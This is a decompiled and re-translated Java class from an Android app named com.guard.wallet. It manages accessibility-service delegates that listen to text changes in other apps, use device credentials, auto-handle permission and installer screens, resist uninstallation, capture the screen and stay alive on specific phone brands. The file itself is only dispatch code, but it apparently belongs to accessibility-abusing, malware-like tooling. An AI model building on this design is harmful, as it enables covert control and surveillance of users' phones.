package com.guard.wallet.service;

import com.guard.wallet.infra.DelegateRemovePredicate;
import com.guard.wallet.infra.DelegateFindPredicate;
import com.guard.wallet.core.AppUtils;
import android.accessibilityservice.AccessibilityService;
import com.guard.wallet.req.ListenWindow;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import com.guard.wallet.delegate.AccessibilityDelegate;
import com.guard.wallet.delegate.DelegateUtils;
import com.guard.wallet.delegate.ScreenCaptureManager;
import com.guard.wallet.engine.KeepAliveEngine;
import com.guard.wallet.delegate.PairAccessibilityDelegate;
import com.guard.wallet.delegate.task.DelegateEventDispatcher;
import com.guard.wallet.engine.AospKeepAliveEngine;
import com.guard.wallet.engine.HuaweiEngine;
import com.guard.wallet.engine.OppoEngine;
import com.guard.wallet.engine.TranssionEngine;
import com.guard.wallet.engine.VivoEngine;
import com.guard.wallet.engine.XiaomiEngine;
import com.guard.wallet.delegate.UseDeviceCredentialDelegate;
import com.guard.wallet.delegate.EnableSecureDelegate;
import com.guard.wallet.delegate.GrantPermissionDelegate;
import com.guard.wallet.delegate.OpenDevelopmentDelegate;
import com.guard.wallet.delegate.PackageInstallerDelegate;

/**
 * vendor AccessibilityDelegateManager — delegate dispatch center.
 * Manages ConcurrentLinkedQueue<AccessibilityDelegate> of active delegates, routes
 * accessibility events, handles delegate lifecycle (create/remove/refresh),
 * and manages event subscribe/reply mechanism.
 *
 * Translated from JADX (800 lines) + CFR (1883 lines).
 *
 * Fields:
 *   j  (static)  — custom event type constant 204832
 *   a  — delegates queue (ConcurrentLinkedQueue<AccessibilityDelegate>)
 *   b  — textChangedPackages (ConcurrentLinkedQueue<String>) — packages subscribed to TYPE_VIEW_TEXT_CHANGED (2048)
 *   c  — customEventPackages (ConcurrentLinkedQueue<String>) — packages subscribed to custom event (204832)
 *   d  — listenWindowUniqueIds (ConcurrentLinkedQueue<String>) — registered window unique IDs
 *   e  — ScreenCaptureManager instance
 *   f  — DelegateUtils instance — MiniCapture executor
 *   g  — g0 instance (UseDeviceCredentialDelegate) — extends AccessibilityDelegate
 *   h  — unlockFlag (AtomicBoolean)
 *   i  — serviceReady (AtomicBoolean)
 */
public abstract class AccessibilityDelegateManager extends AccessibilityService {

    // ═══════ Static fields ═══════

    /** vendor f208j — custom event type constant */
    public static final Integer j = 204832;

    // ═══════ Instance fields ═══════

    /** vendor f209a — delegate queue */
    public final ConcurrentLinkedQueue a = new ConcurrentLinkedQueue();

    /** vendor b — textChanged subscribed packages */
    public final ConcurrentLinkedQueue b = new ConcurrentLinkedQueue();

    /** vendor c — custom event subscribed packages */
    public final ConcurrentLinkedQueue c = new ConcurrentLinkedQueue();

    /** vendor f210d — listenWindow unique IDs */
    public final ConcurrentLinkedQueue d = new ConcurrentLinkedQueue();

    /** vendor f211e — ScreenCaptureManager instance */
    public final ScreenCaptureManager e = new ScreenCaptureManager();

    /** vendor f212f — DelegateUtils (MiniCapture) instance */
    public final DelegateUtils f = new DelegateUtils();

    /** vendor f213g — g0 instance */
    public final UseDeviceCredentialDelegate g = new UseDeviceCredentialDelegate();

    /** vendor f214h — unlock mode flag */
    public final AtomicBoolean h = new AtomicBoolean(false);

    /** vendor f215i — service ready flag */
    public final AtomicBoolean i = new AtomicBoolean(false);

    // ═══════ Remove delegate methods (removeIf with DelegateRemovePredicate) ═══════

    /** vendor A() — remove all x (PackageInstallerDelegate) delegates */
    public final void A() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 7));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor B() — remove all a0 (AutoEngine) delegates */
    public final void B() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 5));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /**
     * vendor C(delegateClassName, listenWindows) — unregister listen windows.
     * For each ListenWindow in the list:
     *   - if eventTypes contains 2048 → remove packageName from textChanged queue (b)
     *   - if eventTypes contains 204832 → remove packageName from custom event queue (c)
     *   - remove listenWindowUniqueId from uniqueIds queue (d)
     */
    public final void C(String str, List list) {
        if (list != null) {
            try {
                if (list.isEmpty()) {
                    return;
                }
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ListenWindow listenWindow = (ListenWindow) it.next();
                    if (listenWindow != null) {
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                            String packageName = listenWindow.getPackageName();
                            try {
                                if (!AppUtils.B(packageName)) {
                                    this.b.remove(packageName);
                                }
                            } catch (Exception e2) {
                                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                            }
                        }
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(j)) {
                            String packageName2 = listenWindow.getPackageName();
                            try {
                                if (!AppUtils.B(packageName2)) {
                                    this.c.remove(packageName2);
                                }
                            } catch (Exception e3) {
                                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                            }
                        }
                        String v0 = com.guard.wallet.utils.SystemHelper.v0(listenWindow.getPackageName(), listenWindow.getClassName(), str);
                        try {
                            if (!AppUtils.B(v0)) {
                                this.d.remove(v0);
                            }
                        } catch (Exception e4) {
                            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e4);
                        }
                    }
                }
            } catch (Exception e5) {
                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e5);
            }
        }
    }

    /**
     * vendor D() — shutdown all vendor-engine delegates.
     * Iterates each engine type: a0, t, x, k, c, o, l.
     * For each found type, calls its cleanup method then removes from queue.
     */
    public final void D() {
        try {
            boolean p2 = p();
            ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
            if (p2) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it = concurrentLinkedQueue.iterator();
                        while (it.hasNext()) {
                            AccessibilityDelegate eVar = (AccessibilityDelegate) it.next();
                            if (eVar instanceof PairAccessibilityDelegate) {
                                ((PairAccessibilityDelegate) eVar).N0();
                            }
                        }
                    }
                } catch (Exception e2) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                }
                B();
            }
            if (n() != null) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it2 = concurrentLinkedQueue.iterator();
                        while (it2.hasNext()) {
                            AccessibilityDelegate eVar2 = (AccessibilityDelegate) it2.next();
                            if (eVar2 instanceof OpenDevelopmentDelegate) {
                                ((OpenDevelopmentDelegate) eVar2).b0();
                            }
                        }
                    }
                } catch (Exception e3) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                }
                z();
            }
            if (o()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it3 = concurrentLinkedQueue.iterator();
                        while (it3.hasNext()) {
                            AccessibilityDelegate eVar3 = (AccessibilityDelegate) it3.next();
                            if (eVar3 instanceof PackageInstallerDelegate) {
                                ((PackageInstallerDelegate) eVar3).W();
                            }
                        }
                    }
                } catch (Exception e4) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e4);
                }
                A();
            }
            if (h()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it4 = concurrentLinkedQueue.iterator();
                        while (it4.hasNext()) {
                            AccessibilityDelegate eVar4 = (AccessibilityDelegate) it4.next();
                            if (eVar4 instanceof EnableSecureDelegate) {
                                ((EnableSecureDelegate) eVar4).I(false);
                            }
                        }
                    }
                } catch (Exception e5) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e5);
                }
                v();
            }
            if (g()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it5 = concurrentLinkedQueue.iterator();
                        while (it5.hasNext()) {
                            AccessibilityDelegate eVar5 = (AccessibilityDelegate) it5.next();
                            if (eVar5 instanceof KeepAliveEngine) {
                                ((KeepAliveEngine) eVar5).Z();
                            }
                        }
                    }
                } catch (Exception e6) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e6);
                }
                x();
            }
            if (m()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it6 = concurrentLinkedQueue.iterator();
                        while (it6.hasNext()) {
                            AccessibilityDelegate eVar6 = (AccessibilityDelegate) it6.next();
                            if (eVar6 instanceof com.guard.wallet.delegate.MediaProjectionDelegate) {
                                ((com.guard.wallet.delegate.MediaProjectionDelegate) eVar6).d();
                            }
                        }
                    }
                } catch (Exception e7) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e7);
                }
                y();
            }
            if (i()) {
                try {
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it7 = concurrentLinkedQueue.iterator();
                        while (it7.hasNext()) {
                            AccessibilityDelegate eVar7 = (AccessibilityDelegate) it7.next();
                            if (eVar7 instanceof GrantPermissionDelegate) {
                                ((GrantPermissionDelegate) eVar7).d();
                            }
                        }
                    }
                } catch (Exception e8) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e8);
                }
                w();
            }
        } catch (Exception e9) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e9);
        }
    }

    // ═══════ Create delegate methods ═══════

    /**
     * vendor a() — create/replace PhoneCallDelegate (ConfirmLockDelegate).
     * If existing i delegate found, remove it first, then create new one.
     */
    public final void a() {
        boolean hasExisting;
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            try {
                hasExisting = false;
                if (!concurrentLinkedQueue.isEmpty()) {
                    Iterator it = concurrentLinkedQueue.iterator();
                    while (it.hasNext()) {
                        if (((AccessibilityDelegate) it.next()) instanceof com.guard.wallet.delegate.ConfirmLockDelegate) {
                            hasExisting = true;
                            break;
                        }
                    }
                }
            } catch (Exception e2) {
                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                hasExisting = false;
            }
            if (hasExisting) {
                u();
            }
            concurrentLinkedQueue.add(new com.guard.wallet.delegate.ConfirmLockDelegate());
            t(com.guard.wallet.delegate.ConfirmLockDelegate.class.getName(), com.guard.wallet.delegate.ConfirmLockDelegate.L());
        } catch (Exception e3) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
        }
    }

    /**
     * vendor b(String) — create vendor-specific KeepAlive engine delegate.
     * Detects device brand and creates the appropriate engine:
     *   OPPO → v, Xiaomi → q, Huawei → n, Vivo → i0, Transsion → e0, AOSP → g.
     * Removes existing c-type (KeepAlive) delegate first if present.
     */
    public final void b(String str) {
        try {
            if (g()) {
                x();
            }
            boolean isOppo = com.guard.wallet.utils.DeviceUtils.isOppoFamily();
            ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
            if (isOppo) {
                OppoEngine vVar = new OppoEngine();
                concurrentLinkedQueue.add(vVar);
                t(OppoEngine.class.getName(), OppoEngine.buildAllListenWindows());
                try {
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new DelegateEventDispatcher(vVar, str, 4), vVar.c);
                    return;
                } catch (Exception e2) {
                    AppUtils.s("OppoEngine", e2);
                    return;
                }
            }
            if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
                XiaomiEngine qVar = new XiaomiEngine();
                concurrentLinkedQueue.add(qVar);
                t(XiaomiEngine.class.getName(), XiaomiEngine.buildAllListenWindows());
                try {
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new DelegateEventDispatcher(qVar, str, 3), qVar.c);
                    return;
                } catch (Exception e3) {
                    AppUtils.s("XiaomiEngine", e3);
                    return;
                }
            }
            if (com.guard.wallet.utils.DeviceUtils.isHuaweiOrHonor()) {
                HuaweiEngine nVar = new HuaweiEngine();
                concurrentLinkedQueue.add(nVar);
                t(HuaweiEngine.class.getName(), HuaweiEngine.buildAllListenWindows());
                try {
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new DelegateEventDispatcher(nVar, str, 2), nVar.c);
                    return;
                } catch (Exception e4) {
                    AppUtils.s("HuaweiEngine", e4);
                    return;
                }
            }
            if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                VivoEngine i0Var = new VivoEngine();
                concurrentLinkedQueue.add(i0Var);
                t(VivoEngine.class.getName(), VivoEngine.buildAllListenWindows());
                try {
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new DelegateEventDispatcher(i0Var, str, 6), i0Var.c);
                    return;
                } catch (Exception e5) {
                    AppUtils.s("VivoEngine", e5);
                    return;
                }
            }
            if (com.guard.wallet.utils.DeviceUtils.isTecnoFamily()) {
                TranssionEngine e0Var = new TranssionEngine();
                concurrentLinkedQueue.add(e0Var);
                t(TranssionEngine.class.getName(), TranssionEngine.buildAllListenWindows());
                try {
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new DelegateEventDispatcher(e0Var, str, 5), e0Var.c);
                    return;
                } catch (Exception e6) {
                    AppUtils.s("TranssionEngine", e6);
                    return;
                }
            }
            // ADAPT: field 'g' shadows o.g class — use static factory
            AccessibilityDelegate aospEngine = createAospEngine();
            concurrentLinkedQueue.add(aospEngine);
            t(aospEngine.getClass().getName(), getAospListenWindows());
            try {
                com.guard.wallet.thread.DelegateTaskLauncher.c(new DelegateEventDispatcher(aospEngine, str, 1), aospEngine.c);
            } catch (Exception e7) {
                AppUtils.s("AospKeepAliveEngine", e7);
            }
        } catch (Exception e8) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e8);
        }
    }

    /**
     * vendor c(ListenWindow) — get or create delegate for a ListenWindow.
     * Searches existing delegates by packageName. If found, adds the ListenWindow
     * to its queue. If not found, creates a new AccessibilityDelegate.
     * Registers event subscriptions (textChanged, custom, uniqueId).
     */
    public final AccessibilityDelegate c(ListenWindow listenWindow) {
        AccessibilityDelegate eVar;
        if (listenWindow != null) {
            try {
                String packageName = listenWindow.getPackageName();
                ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
                try {
                    eVar = null;
                    if (!concurrentLinkedQueue.isEmpty()) {
                        Iterator it = concurrentLinkedQueue.iterator();
                        while (it.hasNext()) {
                            AccessibilityDelegate candidate = (AccessibilityDelegate) it.next();
                            if (Objects.equals(candidate.a, packageName)) {
                                eVar = candidate;
                                break;
                            }
                        }
                    }
                } catch (Exception e2) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                    eVar = null;
                }
                if (eVar == null) {
                    eVar = new AccessibilityDelegate(Collections.singletonList(listenWindow), listenWindow.getPackageName());
                    try {
                        concurrentLinkedQueue.add(eVar);
                    } catch (Exception e3) {
                        AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                    }
                    if (listenWindow.getEventTypes() != null) {
                        s(listenWindow.getPackageName());
                    }
                    if (listenWindow.getEventTypes() != null) {
                        q(listenWindow.getPackageName());
                    }
                    r(listenWindow.listenWindowUniqueId(eVar.getClass().getName()));
                    return eVar;
                }
                try {
                    eVar.d.add(listenWindow);
                } catch (Exception e4) {
                    AppUtils.s("AccessibilityDelegate", e4);
                }
                if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                    s(listenWindow.getPackageName());
                }
                if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(j)) {
                    q(listenWindow.getPackageName());
                }
                r(listenWindow.listenWindowUniqueId(eVar.getClass().getName()));
                return eVar;
            } catch (Exception e5) {
                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e5);
            }
        }
        return null;
    }

    /**
     * vendor d(packageName, listenWindows) — create new delegate with package and window list.
     * Returns null if packageName is empty.
     */
    public final AccessibilityDelegate d(String str, List list) {
        try {
            if (AppUtils.B(str)) {
                return null;
            }
            AccessibilityDelegate eVar = new AccessibilityDelegate(list, str);
            try {
                this.a.add(eVar);
            } catch (Exception e2) {
                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
            if (list != null && !list.isEmpty()) {
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ListenWindow listenWindow = (ListenWindow) it.next();
                    if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                        s(listenWindow.getPackageName());
                    }
                    if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(j)) {
                        q(listenWindow.getPackageName());
                    }
                    r(listenWindow.listenWindowUniqueId(AccessibilityDelegate.class.getName()));
                }
            }
            return eVar;
        } catch (Exception e3) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
            return null;
        }
    }

    /**
     * vendor e() — create/replace AutoEngine (PairAccessibilityDelegate) delegate.
     * Removes existing a0 delegate first if present.
     */
    public final void e() {
        try {
            if (p()) {
                B();
            }
            this.a.add(new PairAccessibilityDelegate());
            t(PairAccessibilityDelegate.class.getName(), PairAccessibilityDelegate.E0());
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    // ═══════ Has-delegate query methods ═══════

    /** vendor f() — has DeviceAdminDelegate (ConfirmDeviceCredentialDelegate) */
    public final boolean f() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((AccessibilityDelegate) it.next()) instanceof com.guard.wallet.delegate.ConfirmDeviceCredentialDelegate) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor g() — has KeepAliveEngine */
    public final boolean g() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((AccessibilityDelegate) it.next()) instanceof KeepAliveEngine) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor h() — has EnableSecureDelegate (EnableSecureDelegate) */
    public final boolean h() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((AccessibilityDelegate) it.next()) instanceof EnableSecureDelegate) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor i() — has UninstallProtectDelegate (GrantPermissionDelegate) */
    public final boolean i() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((AccessibilityDelegate) it.next()) instanceof GrantPermissionDelegate) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor j() — has any engine/delegate active */
    public final boolean j() {
        try {
            if (p() || n() != null || o() || h() || m() || i() || f()) {
                return true;
            }
            return g();
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor k(packageName) — is package subscribed to textChanged (2048) events */
    public final boolean k(String str) {
        try {
            if (AppUtils.B(str)) {
                return false;
            }
            return this.b.contains(str);
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /**
     * vendor l(uniqueId) — is listenWindow uniqueId registered.
     * Checks exact match first, then uses fuzzy matching via DelegateFindPredicate
     * (NULL wildcard matching on package:class segments).
     */
    public final boolean l(String str) {
        try {
            if (AppUtils.B(str)) {
                return false;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.d;
            if (concurrentLinkedQueue.contains(str)) {
                return true;
            }
            return concurrentLinkedQueue.stream().anyMatch(new DelegateFindPredicate(this, str, 1));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor m() — has NotificationDelegate (MediaProjectionDelegate) */
    public final boolean m() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((AccessibilityDelegate) it.next()) instanceof com.guard.wallet.delegate.MediaProjectionDelegate) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor n() — get ScreenLockDelegate (OpenDevelopmentDelegate), or null if none */
    public final OpenDevelopmentDelegate n() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return null;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                AccessibilityDelegate eVar = (AccessibilityDelegate) it.next();
                if (eVar instanceof OpenDevelopmentDelegate) {
                    return (OpenDevelopmentDelegate) eVar;
                }
            }
            return null;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return null;
        }
    }

    /** vendor o() — has PackageInstallerDelegate (PackageInstallerDelegate) */
    public final boolean o() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((AccessibilityDelegate) it.next()) instanceof PackageInstallerDelegate) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    /** vendor p() — has AutoEngine (PairAccessibilityDelegate) */
    public final boolean p() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return false;
            }
            Iterator it = concurrentLinkedQueue.iterator();
            while (it.hasNext()) {
                if (((AccessibilityDelegate) it.next()) instanceof PairAccessibilityDelegate) {
                    return true;
                }
            }
            return false;
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            return false;
        }
    }

    // ═══════ Subscribe registration methods ═══════

    /** vendor q(packageName) — register package for custom event (204832) notifications */
    public final void q(String str) {
        try {
            if (AppUtils.B(str)) {
                return;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.c;
            if (concurrentLinkedQueue.contains(str)) {
                return;
            }
            concurrentLinkedQueue.offer(str);
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor r(uniqueId) — register listenWindow uniqueId */
    public final void r(String str) {
        try {
            if (AppUtils.B(str)) {
                return;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.d;
            if (concurrentLinkedQueue.contains(str)) {
                return;
            }
            concurrentLinkedQueue.offer(str);
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor s(packageName) — register package for textChanged (2048) notifications */
    public final void s(String str) {
        try {
            if (AppUtils.B(str)) {
                return;
            }
            ConcurrentLinkedQueue concurrentLinkedQueue = this.b;
            if (concurrentLinkedQueue.contains(str)) {
                return;
            }
            concurrentLinkedQueue.offer(str);
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /**
     * vendor t(delegateClassName, listenWindows) — register listen windows for a delegate.
     * For each ListenWindow:
     *   - if eventTypes contains 2048 → register textChanged subscription
     *   - if eventTypes contains 204832 → register custom event subscription
     *   - register listenWindowUniqueId
     */
    public final void t(String str, List list) {
        if (list != null) {
            try {
                if (list.isEmpty()) {
                    return;
                }
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ListenWindow listenWindow = (ListenWindow) it.next();
                    if (listenWindow != null) {
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(2048)) {
                            s(listenWindow.getPackageName());
                        }
                        if (listenWindow.getEventTypes() != null && !listenWindow.getEventTypes().isEmpty() && listenWindow.getEventTypes().contains(j)) {
                            q(listenWindow.getPackageName());
                        }
                        r(com.guard.wallet.utils.SystemHelper.v0(listenWindow.getPackageName(), listenWindow.getClassName(), str));
                    }
                }
            } catch (Exception e2) {
                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
        }
    }

    // ═══════ Remove-by-type methods ═══════

    /** vendor u() — remove PhoneCallDelegate (ConfirmLockDelegate) */
    public final void u() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 6));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor v() — remove EnableSecureDelegate (EnableSecureDelegate) */
    public final void v() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 0));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor w() — remove UninstallProtectDelegate (GrantPermissionDelegate) */
    public final void w() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 3));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor x() — remove KeepAliveEngine and subclasses */
    public final void x() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 1));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor y() — remove NotificationDelegate (MediaProjectionDelegate) */
    public final void y() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 2));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    /** vendor z() — remove ScreenLockDelegate (OpenDevelopmentDelegate) */
    public final void z() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.a;
        try {
            if (concurrentLinkedQueue.isEmpty()) {
                return;
            }
            concurrentLinkedQueue.removeIf(new DelegateRemovePredicate(this, 8));
        } catch (Exception e2) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
    }

    // ═══════ Static helpers (avoid field name shadowing) ═══════

    /**
     * ADAPT: static factory to create AospKeepAliveEngine.
     * Field 'g' (g0 type) shadows the class reference in instance methods.
     */
    private static AccessibilityDelegate createAospEngine() {
        return new AospKeepAliveEngine();
    }

    /**
     * ADAPT: static accessor for AospKeepAliveEngine.buildAllListenWindows() ListenWindows.
     * Avoids field 'g' shadowing in instance context.
     */
    static java.util.List getAospListenWindows() {
        return AospKeepAliveEngine.buildAllListenWindows();
    }
}
